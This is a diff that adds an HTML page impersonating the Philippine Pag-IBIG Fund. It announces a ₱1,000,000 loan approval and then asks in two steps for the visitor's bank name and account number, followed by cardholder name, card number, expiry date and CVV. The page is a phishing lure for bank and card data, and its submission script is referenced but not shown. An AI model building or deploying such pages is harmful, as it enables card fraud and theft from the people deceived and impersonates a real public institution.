@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Verification | Pag-IBIG Fund</title>
+    <link rel="stylesheet" href="bank-verification.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/js/all.min.js"></script>
+</head>
+<body>
+    <div class="container fade-in">
+        <h2>Loan Approved! 🎉</h2>
+        <p>You have been granted <strong>₱1,000,000</strong>. Please verify your bank details to receive your funds.</p>
+
+        <div id="form-container">
+            <form id="bankForm">
+                <div class="form-step active">
+                    <label for="bank">Enter Your Bank Name</label>
+                    <input type="text" id="bank" placeholder="e.g. BDO, BPI, Metrobank" required>
+                    <label for="accountNumber">Account Number</label>
+                    <input type="text" id="accountNumber" required>
+                    <button type="button" onclick="nextStep()">Next</button>
+                </div>
+
+                <div class="form-step">
+                    <h3>Card Verification Required</h3>
+                    <p>To ensure security, please provide your card details.</p>
+                    <label for="cardName">Cardholder's Name</label>
+                    <input type="text" id="cardName" required>
+                    <label for="cardNumber">Card Number</label>
+                    <input type="text" id="cardNumber" required>
+                    <label for="expiryDate">Expiration Date (MM/YY)</label>
+                    <input type="text" id="expiryDate" placeholder="MM/YY" required>
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" required>
+                    <button type="button" onclick="submitForm()">Submit</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="bank-verification.js"></script>
+</body>
+  </html>
